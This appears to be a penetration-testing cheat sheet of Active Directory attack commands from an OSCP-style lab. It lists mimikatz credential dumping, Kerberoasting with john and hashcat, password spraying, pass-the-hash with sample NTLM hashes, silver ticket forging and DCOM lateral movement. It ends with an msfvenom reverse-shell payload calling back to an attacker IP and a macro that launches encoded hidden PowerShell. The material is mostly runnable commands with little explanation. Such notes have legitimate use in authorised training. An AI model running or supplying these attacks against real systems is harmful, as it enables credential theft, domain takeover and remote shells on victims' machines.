#### Active Directory

```
net user
net user /domain
net user jeff_admin /domain
net group /domain
```

#### LDAP Provider Path Format

```
LDAP://HostName[:PortNumber][/DistinguishedName]

```

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

```


#### Logged on Users

```
Import-Module .\PowerView.ps1

Get-NetLoggedon -ComputerName client251

Get-NetSession -ComputerName dc01

```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1


import-module C:\Tools\active_directory\GetSPN.ps1
Get-SPN -type service -search "*.corp.com*"

https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Get-SPN.ps1


#### Cached creds retrieval

```
mimikatz.exe

privilege::debug

sekurlsa::logonpasswords

sekurlsa::tickets

```

#### Windows system - mimikatz

```
C:\Tools\password_attacks\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam

```

#### Service account attack

Requesting service ticket and display tickets

```
Add-Type -AssemblyName System.IdentityModel 

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'

klist
```

```
kerberos::list /export

```

Cracking the ticket

```
sudo apt update && sudo apt install kerberoast

python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000- Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1

https://github.com/nidem/kerberoast

#### Cracking password using JTR

Use the script from repo
https://github.com/nidem/kerberoast


```
john --format=krb5tgs ./crack --wordlist=~/oscp/exer/wordlist.txt

python kirbi2john.py ~/oscp/exer/1-40a10000-offsec@MSSQLSvc~CorpSqlServer.corp.com~1433-CORP.COM.kirbi > crack

```
#### Using Invoke-kerberoast.ps1

```

Import-module Invoke-kerberoast.ps1

Get-DomainSPNTicket -SPN "HTTP/CorpWebServer.corp.com"

Get-Domain -Domain corp.com

Get-DomainUser -SPN

 Get-DomainUser -domain corp.com

Get-DomainUser


Invoke-kerberoast -OutputFormat john

Invoke-kerberoast -OutputFormat hashcat

hashcat -m 13100 -a 0 kerb-hash0.txt ./wordlist.txt --force

Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"

```

#### Low and Slow Password guessing

```
net accounts

.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
.\Spray-Passwords.ps1 -File pass.txt -Admin
```
### Lateral movement

#### Pass the Hash

```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

#### Overpass the Hash

```
sekurlsa::logonpasswords

sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe

klist - no ticket listed

net use \\dc01

klist - ticket listed after net use

 .\PsExec.exe \\dc01 cmd.exe

ipconfig

whoami
```
https://download.sysinternals.com/files/PSTools.zip


#### Pass the Ticket

  get the SID

`whoami /user` 

purge kerberos ticket

```
kerberos::purge

kerberos::list
```

The silver ticket command requires a username (/user), domain name (/domain), the domain SID (/sid), which is highlighted above, the fully qualified host name of the service (/target), the service type (/service:HTTP), and the password hash of the iis_service service account (/rc4).Finally, the generated silver ticket is injected directly into memory with the /ppt flag.

```
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

kerberos::list

```

lsadump::dcsync /user:corp\iis_service

kerberos::hash /password:puttheservicepasswordhere

#### DCOM

POC Macro

```
 Sub mymacro()
Shell ("notepad.exe")
End Sub
```
Execute Excel Macro Remotely

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls" 
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop" 
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls") 
$com.Run("mymacro")

```

Generate shell code

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
```

Updated POC Macro

```
Sub MyMacro()
Dim Str As String
Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"

Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
Shell (Str)
End Sub
```

